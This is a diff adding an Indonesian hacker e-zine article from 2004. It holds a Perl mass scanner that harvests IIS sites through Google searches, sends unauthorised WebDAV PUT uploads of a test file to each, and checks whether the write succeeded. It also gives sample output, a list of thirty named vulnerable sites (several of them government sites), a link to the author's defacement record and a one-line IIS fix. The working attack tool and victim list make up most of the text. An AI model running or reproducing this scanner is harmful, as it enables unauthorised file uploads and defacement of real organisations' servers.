@@ -1,0 +1,298 @@
+
+	____________________   ___ ___ ________   
+	\_   _____/\_   ___ \ /   |   \\_____  \  
+	 |    __)_ /    \  \//    ~    \/   |   \ 
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/ 
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       08
+
+Author: bima_ || iko94@yahoo.com
+	www.geocities.com/iko94
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+
+
+/*********************************************************
+ * Webdav Mass Scanner menggunakan perl script
+ * grab urls dari Google (bug lama).
+ * 
+ * Impact : IIS
+ *
+ * oleh    : iko (iko94@yahoo.com)
+ *           www.geocities.com/iko94
+ * release : august,09,2004
+ *
+ * No Warranty. This tutorial is for educational use only, 
+ * commercial use is prohibited.
+ *
+ **********************************************************/
+
+Anda pernah membaca artikel-artikel mengenai deface dari webfolder ?
+1. http://www.jasakom.com/Artikel.asp?ID=495
+2. http://ezine.echo.or.id/ezine6/ez-r06-beben-webfolder.txt
+
+Sebenarnya itu adalah bug webdav dari IIS (lagi-lagi).
+Hemmm, bug lawas ya ? Emang...  :)
+Tapi apakah para admin cukup teliti dalam menjaga websitenya ?
+Kita lihat saja....  :))
+
+Kali ini penulis akan menyajikan skrip scan massal dari google
+dengan sasaran bug webdav tersebut.
+
+
+*************awal potong di sini********************************
+#!/usr/bin/perl
+#
+# [public version]
+# 
+
+require LWP::UserAgent;
+use HTTP::Message;
+use URI::Escape;
+
+
+$baner=<<END
+Google put method lewat konsole...
+:))
+
+END
+;
+printlog($baner);
+
+$proxy = 'http://172.9.18.116:80/';
+$log="put_lwp_google.log";
+$fsav="put_google.txt";
+$tempfile="put_temp.txt";
+
+$komponen=$ARGV[0];
+
+$usage = "Usage: perl $0 <keyword> 
+Example : perl $0 \".co.id/*.asp\" \n";
+if($#ARGV<0) { die "$usage"; }
+
+$ua = LWP::UserAgent->new;
+$ua->timeout(35);
+$ua->agent("MSIE/6.0 Windows");
+$ua->proxy(http => $proxy) if defined($proxy);
+
+$browser = LWP::UserAgent->new;
+$browser -> agent($Agent);
+$browser->proxy(http => $proxy) if defined($proxy);
+
+$counter=0;
+
+#Read last session
+open(hf,$fsav);
+$lastsav=<hf>;
+close(hf);
+$check=1;#Check if any save session
+
+$nomer=1;
+while(1)
+{
+$gourl = "http://www.google.com/search?q=allinurl:$komponen&num=10&hl=en&lr=&ie=UTF-8&oe=utf-8&start=$counter&sa=N";
+$grabresponse = $ua->get($gourl);
+$counter=$counter+10;
+if (!($grabresponse->is_success)) {
+printlog ($grabresponse->status_line. "  Failure\n");
+} else {
+
+$data1 = $grabresponse->as_string;
+open(lol,">$tempfile");
+print lol $data1;
+close(lol);
+
+open(lol,$tempfile) || die("Cannot open the file");
+@loli=<lol>;
+close(lol);
+$data=join("",@loli);
+
+exit if ($data=~/Google does not serve more than 1000/); #End Google search or Stop
+@tmp=split(/\<p class\=g\>\<a href\=http\:\/\//,$data);
+for ($a = 1; $a < $#tmp; $a++)
+{
+  @u=split(/\>/,$tmp[$a]);
+  @t=split(/\/mod/,$u[0]);
+  $url=$t[0];
+
+  if (($lastsav ne "") && (!($lastsav =~ /$url/)) && $check)
+  {
+     next;
+  } else
+  {
+     $check=0;
+  }
+  #Save Session
+  open(hf,">$fsav");
+  print hf $url;
+  close(hf);
+  
+  printlog("$nomer. http://$url\t");
+  $nomer++;
+  @y=split(/\//,$url);
+  $url=$y[0];
+  $urltarget="http://$url";
+  $urltarget=~s/ /%20/g;
+  print "\nProcessing $urltarget.....\n";
+
+$loginpost = $urltarget."/bima_test.html";
+$loginrequest = HTTP::Request->new(PUT => $loginpost);
+$loginrequest->content_type('text/html');
+$loginsend = 'tes tes tes 123';
+$loginrequest->content-length($loginsend);
+$loginrequest->referer($urltarget);
+$loginrequest->content($loginsend);
+print "Proses PUT sedang berlangsung...\n";
+$loginresponse = $browser->request($loginrequest);
+$logincek = $loginresponse->as_string;
+
+  if (!($loginresponse->is_success)) {
+       print ("$loginpost  Failure\n");
+       printlog ("Gagal total ".$loginresponse->status_line. "  Failure\n");
+     } else {
+       print ("$loginpost  Success\n");
+       printlog ($loginresponse->status_line. "  could be Success\n");
+       #print "$logincek\n";
+       $req = HTTP::Request->new(GET => $loginpost);
+       $req ->header('Accept' => 'text/html');
+       $res = $browser->request($req);
+         if ($res->is_success) {
+            $cekcek=$res->content=~/tes tes tes 123/g; 
+            if ($cekcek) {
+               printlog ("\ncek url ".$res->status_line."\n");  # or whatever
+               #printparse ($res->content);
+            } else {   #get
+                 printlog ("gak ada url, put gagal...  ".$res->status_line."\n");
+              }
+         }
+         else { #put
+             printlog ("gagal PUT file...  ".$res->status_line."\n");
+         }
+
+  }
+
+printlog("\n");
+} #end of for
+
+} #end of if
+
+} #end of while
+
+
+sub printlog {
+print @_[0];
+open(lo,">>$log");
+print lo @_[0];
+close(lo);
+return;
+}
+
+*************akhir potong di sini********************************
+
+Outputnya akan seperti berikut ini:
+
+*****************************************************************
+178. http://www.cead.unp.ac.za/Applications.asp
+Processing http://www.cead.unp.ac.za.....
+Proses PUT sedang berlangsung...
+http://www.cead.unp.ac.za/bima_test.html  Failure
+Gagal total 501 Not Implemented  Failure
+
+179. http://www.hicte.uwc.ac.za/default.asp?ShowToolbarAsImages=1
+Processing http://www.hicte.uwc.ac.za.....
+Proses PUT sedang berlangsung...
+http://www.hicte.uwc.ac.za/bima_test.html  Success
+201 Created  could be Success
+
+cek url 200 OK
+
+180. http://www.expertise.und.ac.za/courses.asp
+Processing http://www.expertise.und.ac.za.....
+Proses PUT sedang berlangsung...
+http://www.expertise.und.ac.za/bima_test.html  Failure
+Gagal total 403 Forbidden  Failure
+*****************************************************************
+
+
+
+
+Situs-situs yang masih vulner diantaranya :
+1. http://www.ramadajarvis.co.uk/bima_test.html
+2. http://www.bali.go.id/bima_test.html
+3. http://www.inaweb.co.id/bima_test.html
+4. http://www.setkab.go.id/bima_test.html
+5. http://www.jasatirta1.go.id/bima_test.html
+6. http://pmsserv.dki.go.id/bima_test.html 
+7. http://pmsserv.jakarta.go.id/bima_test.html
+8. http://www.netflorist.co.za/bima_test.html
+9. http://www.netcare.co.za/bima_test.html
+10. http://www.autograph.co.za/bima_test.html
+11. http://www.cid.co.za/bima_test.html
+12. http://www.tableview.co.za/bima_test.html
+13. http://www.chillies.co.za/bima_test.html
+14. http://www.arrivealive.co.za/bima_test.html
+15. http://www.merck.co.za/bima_test.html
+16. http://www.forexafrica.co.za/bima_test.html
+17. http://www.contractwork.co.za/bima_test.html
+18. http://www.allesmotors.co.za/bima_test.html
+19. http://www.ccma.org.za/bima_test.html
+20. http://www.wbsa.org.za/bima_test.html
+21. http://www.ntsika.org.za/bima_test.html
+22. http://www.ibcsa.org.za/bima_test.html
+23. http://www.nepa.org.za/bima_test.html
+24. http://www.fe.techpta.ac.za/bima_test.html
+25. http://www.software-e-commerce.com/bima_test.html
+26. http://www.hicte.uwc.ac.za/bima_test.html
+27. http://idlelo.uwc.ac.za/bima_test.html
+28. http://www.southafricahc.org.sg/bima_test.html
+29. http://www.westerncapepremier.gov.za/bima_test.html
+30. http://www.ruralnews.co.nz/bima_test.html
+
+Dan masih banyak lagi...
+http://www.zone-h.org/en/defacements/filter/filter_defacer=bima+%5Bat%5D+www.neoteker.or.id/
+
+Salah satu solusi :
+matikan pilihan write di konfigurasi IIS.
+
+Cukup sekian yang bisa penulis sampaikan.
+
+:))
+
+REFERENSI :
+1. Bukunya S'to Seni Internet Hacking
+2. ActiveState ActivePerl 5.8 Documentation
+3. Bukunya REGEX Steven Haryanto
+
+*very very very special greetz to:
+[+][+][+] my beloved anna [+][+][+]
+
+*shout to dhanny firman syah : keep fighting, bro...
+
+*special greetz to: 
+[+] www.neoteker.or.id
+[+] www.echo.or.id
+[+] www.bosen.net
+[+] www.waraxe.us
+[+] qq
+[+] tiyox
+[+] bosen
+[+] ftp_geo
+[+] sakitjiwa
+[+] tiong
+[+] all #1stlink #neoteker #e-c-h-o #batamhacker #kartubeben #antihackerlink crew @ dal net
+[+] all #1stlink #romance #hackers @ centrin
+[+] alphacentupret, fuzk3 kendi
+[+] boeboe (dah kehabisan target yach...)
+[+] y3d1ps, z3r0byt3, biatch-x, K-159, Cmaster4
+
+*contact:
+[+] iko94(at)yahoo(dot)com
+[+] www.geocities.com/iko94
+[+] www.neoteker.or.id
+
+[EOF]
